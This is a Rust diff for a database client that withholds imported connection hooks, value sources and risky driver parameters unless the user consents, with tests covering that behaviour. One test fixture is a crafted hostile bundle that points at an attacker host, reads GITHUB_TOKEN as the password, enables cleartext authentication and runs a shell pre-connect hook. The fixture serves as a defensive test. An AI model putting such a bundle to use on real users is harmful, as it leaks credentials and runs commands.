@@ -249,6 +249,9 @@ pub struct ImportOutcome {
     /// not be resolved. These connections were NOT imported to prevent silent topology
     /// degradation (e.g. bastion-routed → direct-connect).
     pub unresolved_refs: Vec<String>,
+    /// Imported connections whose hooks, value sources or risky driver
+    /// parameters were left out because the user did not consent to them.
+    pub withheld: Vec<dbflux_portability::WithheldEntries>,
 }
 
 /// Result returned by `ImportPersistence::add_connection`.
@@ -431,6 +434,13 @@ pub fn persist_import_actions(
     // filter below uses an exact prefix match rather than a loose substring search.
     // `connection_secret_ref` produces the canonical `"dbflux:conn:<uuid>"` prefix that
     // all connection-scoped secret refs begin with.
+    // A connection that was not persisted has nothing to re-enter.
+    outcome.withheld = actions
+        .withheld
+        .into_iter()
+        .filter(|entries| !skipped_conn_ids.contains(&entries.connection_id))
+        .collect();
+
     let skipped_conn_refs: std::collections::HashSet<String> = skipped_conn_ids
         .iter()
         .map(dbflux_core::connection_secret_ref)
@@ -1187,6 +1197,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         }
     }
 
@@ -1257,6 +1268,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1283,6 +1295,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1307,6 +1320,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1332,6 +1346,7 @@ mod tests {
             )],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1358,6 +1373,7 @@ mod tests {
             )],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1380,6 +1396,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1457,6 +1474,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         persist_import_actions(actions, &mut recorder);
@@ -1528,6 +1546,7 @@ mod tests {
             secret_writes: vec![],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1627,6 +1646,7 @@ mod tests {
             ],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let outcome = persist_import_actions(actions, &mut deps);
@@ -1897,6 +1917,7 @@ mod tests {
             )],
             kind_failures: vec![],
             unresolved_ref_connections: vec![],
+            withheld: vec![],
         };
 
         let mut tracker = HydrationTracker {
@@ -2022,5 +2043,141 @@ mod tests {
         let mut includes = default_candidate_includes(2);
         toggle_candidate_include(&mut includes, 5);
         assert_eq!(includes, vec![true, true]);
+    }
+
+    // -----------------------------------------------------------------------
+    // Import consent through the app-layer entry point
+    // -----------------------------------------------------------------------
+
+    /// A hand-written bundle with a hook, a value source that reads a local
+    /// secret and a driver parameter that weakens MySQL authentication.
+    const CRAFTED_BUNDLE: &str = r#"
+[bundle]
+format_version = 1
+created_at = "2026-10-31T00:00:00Z"
+dbflux_version = "0.9.0"
+encryption = "none"
+
+[[connections]]
+local_id = "c1"
+name = "Team prod"
+driver_id = "mysql"
+kind = "MySQL"
+include_hooks = true
+driver_params = [{ key = "enable_cleartext_plugin", value = "true" }]
+
+[connections.fields]
+host = "db.attacker.example"
+
+[connections.value_refs.password]
+source = "env"
+key = "GITHUB_TOKEN"
+
+[[connections.hooks_payload.pre_connect]]
+kind = "command"
+command = "sh"
+args = ["-c", "id"]
+"#;
+
+    /// Keeps every connection it is handed, to inspect what was persisted.
+    #[derive(Default)]
+    struct CapturingPersistence {
+        connections: Vec<ConnectionProfile>,
+    }
+
+    impl ImportPersistence for CapturingPersistence {
+        fn add_auth_profile(&mut self, _profile: AuthProfile) {}
+
+        fn add_ssh_tunnel(&mut self, _tunnel: SshTunnelProfile) {}
+
+        fn add_proxy(&mut self, _proxy: ProxyProfile) {}
+
+        fn add_connection(&mut self, profile: ConnectionProfile) -> ConnectionInsertResult {
+            self.connections.push(profile);
+            ConnectionInsertResult::Ok
+        }
+
+        fn write_secret(&self, _secret_ref: &str, _secret: &SecretString) -> bool {
+            true
+        }
+
+        fn hydrate_auth_secret_fields(
+            &mut self,
+            _auth_id: uuid::Uuid,
+            _fields: HashMap<String, SecretString>,
+        ) {
+        }
+    }
+
+    fn apply_crafted(choices: &ResolutionChoices) -> (ImportOutcome, CapturingPersistence) {
+        let parsed = dbflux_portability::import::parse(CRAFTED_BUNDLE.as_bytes()).expect("parses");
+        let dest = OwnedDestSnapshot {
+            auth_profiles: vec![],
+            ssh_tunnels: vec![],
+            proxies: vec![],
+            connections: vec![],
+        };
+        let plan = dbflux_portability::import::plan(&parsed, &dest.as_ref_snapshot());
+        let mut deps = CapturingPersistence::default();
+        let outcome = apply_import(&parsed, &plan, choices, &mut deps).expect("apply_import");
+        (outcome, deps)
+    }
+
+    #[test]
+    fn apply_import_persists_no_hooks_value_sources_or_risky_params_without_consent() {
+        let (outcome, deps) = apply_crafted(&ResolutionChoices::default());
+
+        let profile = deps.connections.first().expect("connection persisted");
+        assert!(profile.hooks.is_none());
+        assert!(profile.value_refs.is_empty());
+        assert!(profile.driver_params.is_empty());
+
+        assert_eq!(outcome.withheld.len(), 1);
+        assert_eq!(outcome.withheld[0].connection_name, "Team prod");
+        assert_eq!(outcome.withheld[0].hooks, 1);
+        assert_eq!(outcome.withheld[0].value_refs, 1);
+        assert_eq!(outcome.withheld[0].driver_params, 1);
+    }
+
+    #[test]
+    fn apply_import_persists_everything_with_consent() {
+        let choices = ResolutionChoices {
+            consent: dbflux_portability::ImportConsent::all(),
+            ..ResolutionChoices::default()
+        };
+        let (outcome, deps) = apply_crafted(&choices);
+
+        let profile = deps.connections.first().expect("connection persisted");
+        assert!(profile.hooks.is_some());
+        assert_eq!(profile.value_refs.len(), 1);
+        assert_eq!(profile.driver_params.len(), 1);
+        assert!(outcome.withheld.is_empty());
+    }
+
+    #[test]
+    fn withheld_entries_of_connections_that_were_not_persisted_are_dropped() {
+        let kept = make_conn_profile("Kept", "sqlite");
+        let skipped = make_conn_profile("Skipped", "missing-driver");
+        let entries = |profile: &ConnectionProfile| dbflux_portability::WithheldEntries {
+            connection_id: profile.id,
+            connection_name: profile.name.clone(),
+            hooks: 1,
+            value_refs: 0,
+            driver_params: 0,
+        };
+
+        let mut actions = make_import_actions_empty();
+        actions.withheld = vec![entries(&kept), entries(&skipped)];
+        actions.connections = vec![kept, skipped];
+
+        let mut deps = FakePersistence::with_drivers(&["sqlite"]);
+        let outcome = persist_import_actions(actions, &mut deps);
+
+        let names: Vec<&str> = outcome
+            .withheld
+            .iter()
+            .map(|entries| entries.connection_name.as_str())
+            .collect();
+        assert_eq!(names, vec!["Kept"]);
     }
 }
